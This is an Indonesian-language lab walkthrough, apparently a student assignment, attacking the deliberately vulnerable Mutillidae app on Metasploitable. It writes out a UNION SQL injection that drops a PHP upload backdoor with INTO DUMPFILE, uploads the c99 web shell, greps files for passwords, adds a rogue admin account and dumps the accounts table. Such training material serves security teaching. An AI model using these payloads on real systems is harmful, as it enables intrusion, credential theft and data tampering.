### LESSON 11
1. Pada terminal kali linux ketikan perintah untuk membuat direktori baru (mkdir -p /root/backdoor) lalu masuk ke dalam direktori yang baru dibuat dengan perintah (cd /root/backdoor/) lalu mendownload file yang sudah disedikana dengan perintah(wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson11/stuff.rar). Lalu check hasilnya dengan melakukan direktori listing dengan perintah (ls -lrt). hasilnya adalah sebagai berikut
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/1.1.png "download file")

2. Lakukan unrar dengan perintah (unrar x stuff.rar). Kemudian gabungkan menjadi satu dengan perintah (cat part1.txt part2.txt part3.txt > c99.php). Lalu buat backup file dengan perintah copy (cp c99.php c99.php.bkp). Lakukan direktori listing dengan perintah (ls -lrt) untuk melihat hasilnya
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/1.2.png "unrar file")

3. Lakukan pemeriksaan header pada file c99.php dengan perintah (head -1 c99.php). Dapat dilihat file tidak mengandung "<?php" sehingga untuk menambhakannya ketikan perintah (sed -i '1 s/^.*$/<?php/g' c99.php). Ketikan perintah (head -1 c99.php) lagi dan baris pertama file c99.php mengandung "<?php". Lalu jalankan perintah (gzip c99.php) untuk mengcompres file. Kemudiann lakukan direktori listing untuk melihat hasilnya (ls -l)
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/1.3.png "mengedit .php")

4. Selanjutnya, pindah ke terminal pada metasploitable. Ketikan perintah (sudo mysql) / (mysql -u[nama_user] -p[password]) untuk menjalankan CLI dari mysql. Kemudian ketikan perintah (show databases;) untuk menampilkan seluruh database yang ada. 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/2.1.png "mysql cli")

5. Lalu ketikan perintah (use owasp10) untuk mengaktifkan database owasp sebagai database aktif. Lalu perintah (show tables;) untuk menampilkan seluruh tabel yang ada.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/2.2.png "change db")

6. Lalu ketikan perintah (desc accounts;) untuk menampilkan struktur dari tabel accounts.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/2.3.png "desc accounts")
Dapat dilihat bahwa ada 5 kolom pada tabel ini, sehingga untuk melakukan union maka dibutuhkan 5 kolom contohnya adalah sebagai berikut (' union select null,null,null,null,null' -- )

7. Selanjutnya, buka browser pada kali linux dan ketikan perintah URL sebagai berikut [IP_metasploitable]/mutillidae seperti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/3.1.png "Mutillidae Homepage") 
pada gambar 192.168.56.101/mutillidae

8. Pilih owasp10, injection, sqli-extract data, user info
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/3.2.png "open userinfo")

9. Selanjutnya adalah melakukan injeksi berupa form upload ke dalam halaman user info. Hal ini dilakukan dengan pertama mengklik kanan pada tombol "View Account Detail". Pilih inspect element. Lalu ubah text-allign:center menjadi text-allign:left. seperti pada gambar 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/3.3.png "edit button")
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/3.4.png "edit button2")

10. Selanjutnya klik kanan pada kolom input name, pilih inspect element, ganti size:20 menjadi size:550.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/3.5.png "edit inputbox")

11. Ketikan perintah berikut pada kolom name (' union select null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 770 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/mutillidae/upload_file.php' -- ). jangan lupa spasi pada akhir perintah setelah tanda (-- ). Perintah ini adalah membuat sebuah form upload di /var/www/mutillidae direktori dengan nama upload_file.php. Jika tidak ada error hasilnya adalah sebagai berikut. 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/3.6.png "insert backdoor")

12. Ketikan perintah URL sebagai berikut [IP_metasploitable]/mutillidae/upload_file.php seperti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.1.png "created backdoor page") 
pada gambar 192.168.56.101/mutillidae/upload_file.php

13. Pilih browse untuk memilih file yang akan diupload. cari file c99.php (jika tidak ada dapat menjalankan perintah [cp c99.php.bkp c99.php] terlebih dahulu)
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.2.png "browse file") 
Setelah itu pilih ok dan tekan submit_query.

14. Ketikan perintah URL sebagai berikut [IP_metasploitable]/mutillidae/c99.php seperti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.3.png "open c99.php") 
pada gambar 192.168.56.101/mutillidae/c99.php

15. Pilih sec pada navigation bar. 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.3a.png "sec button") 

16. Ketikan perintah (pwd) pada command execute di bagian kiri, untuk melihat working directory. 
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.4.png "check pwd"). Lalu klik execute 
 
17. Hasilnya adalah sebagai berikut
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.5.png "hasil pwd") 

18. Ketikan perintah (find /var/www/mutillidae -name "*.php" | xargs grep -i "password" | grep "=") untuk mencari kata password pada seluruh isi file dan menampilkannya.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.6.png "find password") 

19. Hasilnya adalah sebagai berikut
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.7.png "hasil find password") 

20. Pilih SQL pada navigation bar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.3a.png "sql button") 

21. Pada kolom username isikan nama username database (dalam contoh ini root), password (adalah blank) dan database name adalah owasp10.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.8.png "enter db")

22. Hasilnya adalah seluruh tabel pada owasp10 ter-list
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.9.png "list tabel")

23. Pilih tabel accounts sehingga hasilnya seperti ini
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.10.png "enter accounts") 
 
24. Buat sebuah record baru dengan cid:17 (bisa di kosongkan), name:hacker, password:hacker, mysignature:hello_hacker, is_admin:true.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.11.png "insert new") 

25. Hasilnya adalah
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.12.png "hasil insert") 

26. Pilih dump seprti pada gambar
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.11a.png "dump button") 

27. Isikan nama database dengan owasp10, only tables: accounts, file:/dump_owasp_account.sql, dan download maupun save to file tercentang.
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.13.png "config dump") 

28. Lalu klik dump. Hasilnya adalah
  ![alt text](https://github.com/KharismaMonika/Tugas-Final-PKSJ/blob/master/Mutillidae/LESSON_11/4.14.png "download dump file") Lalu klik save file. 

